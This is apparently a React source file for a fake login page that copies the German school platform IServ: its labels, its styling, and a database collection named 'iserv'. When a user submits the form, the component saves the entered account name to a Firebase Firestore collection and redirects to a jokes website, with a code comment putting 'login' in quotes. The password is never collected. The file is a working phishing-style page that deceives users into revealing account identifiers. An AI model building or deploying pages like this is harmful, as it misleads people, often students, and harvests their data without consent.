import { useState } from "react";
import { Eye, EyeOff } from "lucide-react";

import { collection, addDoc } from "firebase/firestore";
import { db } from "./firebase";

function Login() {
  const [showPassword, setShowPassword] = useState(false);

  async function saveData(message) {
    try {
      await addDoc(collection(db, "user_data", "iserv", "messages"), {
        text: message,
        timestamp: Date.now(),
      });
      window.location.href = "https://schlechtewitze.com/top"; // redirect to target page after "login"
    } catch (e) {
      console.error("Fehler beim Speichern:", e);
    }
  }

  function handleSubmit(event) {
    event.preventDefault();
    const userName = event.target.userName.value;
    const message = userName;

    localStorage.setItem("hasVisited", true);
    saveData(message);
  }

  return (
    <div className="w-[90%] md:w-[75%] mt-8">
      <div className="flex flex-row justify-between items-baseline w-full">
        <h1 className="text-[22px] dark:text-white">Anmeldung</h1>
        <a
          className="dark:text-[#67baff] text-[#0062b3] hover:underline text-[14px]"
          href="#"
        >
          Hilfe
        </a>
      </div>

      <form className="flex flex-col mt-2" onSubmit={handleSubmit}>
        <input
          type="text"
          id="userName"
          name="userName"
          placeholder="Account"
          className="w-full p-2 mb-4 border font-[14px]
                    bg-white text-black border-gray-500
                    dark:bg-[#1a1a1a] dark:text-white dark:border-gray-600
                    focus:ring-1 focus:ring-blue-400 focus:outline-none
                    focus:shadow-[0_0_10px_#3b82f6]"
        />

        <div className="w-full font-[14px]">
          <div
            className="flex items-center  mb-2 border font-[14px]
                bg-white text-black border-gray-500
                dark:bg-[#1a1a1a] dark:text-white dark:border-gray-600"
          >
            <input
              type={showPassword ? "text" : "password"}
              id="password"
              name="password"
              placeholder="Passwort"
              className="dark:text-white pr-0 w-full focus:outline-none p-2
              focus:ring-1 focus:ring-blue-400
              focus:shadow-[0_0_10px_#3b82f6]"
            />

            <div className="ml-0.5 h-full border-l border-gray-600 px-3 flex items-center p-2">
              <button
                type="button"
                onClick={() => setShowPassword(!showPassword)}
                className="text-gray-400"
              >
                {showPassword ? <EyeOff size={20} /> : <Eye size={20} />}
              </button>
            </div>
          </div>
        </div>

        <div class="flex flex-row justify-between align-items-center login-form-field">
          <div className="checkbox m0">
            <label class="flex text-[14px] align-items-center dark:text-white">
              <input
                className="mr-1"
                type="checkbox"
                id="remember_me"
                name="_remember_me"
                tabIndex="1"
              />
              Angemeldet bleiben
            </label>
          </div>
          <div class="text-right">
            <a
              className="dark:text-[#67baff] text-[#0062b3] hover:underline text-[14px]"
              href="#"
            >
              Passwort vergessen?
            </a>
          </div>
        </div>

        <button
          type="submit"
          className="dark:bg-[#67baff] bg-[#0062b3] dark:text-black text-white hover:bg-blue-600 dark:hover:bg-blue-300 mt-10 p-2"
        >
          → Anmelden
        </button>
      </form>
    </div>
  );
}

export default Login;
